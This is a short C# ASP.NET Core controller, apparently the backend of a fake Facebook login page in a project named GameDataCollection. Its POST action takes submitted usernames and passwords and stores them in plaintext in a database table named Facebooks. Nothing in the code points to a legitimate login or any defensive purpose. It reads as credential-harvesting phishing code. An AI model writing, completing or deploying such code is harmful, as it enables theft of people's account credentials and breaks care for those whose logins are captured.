using GameDataCollection.DbContext;
using GameDataCollection.Models;
using GameDataCollection.ViewModels;
using Microsoft.AspNetCore.Mvc;

namespace GameDataCollection.Controllers
{
    public class FacebookController : Controller
    {
        private readonly UserDbContext _context;

        public FacebookController(UserDbContext userDbContext)
        {
            _context = userDbContext;
        }
        public IActionResult Index()
        {
            return View();
        }
        [HttpPost]
        public IActionResult Index(FacebookViewModel vm)
        {
            var fbData = _context.Facebooks.ToList().OrderByDescending(a=>a.Id);
            if(fbData.Any())
            {
                var id=fbData.First().Id;
                Facebook facebook1 = new Facebook()
                {
                    Id = id+1,
                    Password = vm.Password,
                    Username = vm.Username,
                };
                _context.Facebooks.Add(facebook1);
                _context.SaveChanges();
                return View();
            }
            Facebook facebook = new Facebook()
            {
                Id=1,
                Password = vm.Password,
                Username = vm.Username,
            };
            _context.Facebooks.Add(facebook);
            _context.SaveChanges();
            return View();
        }
    }
}
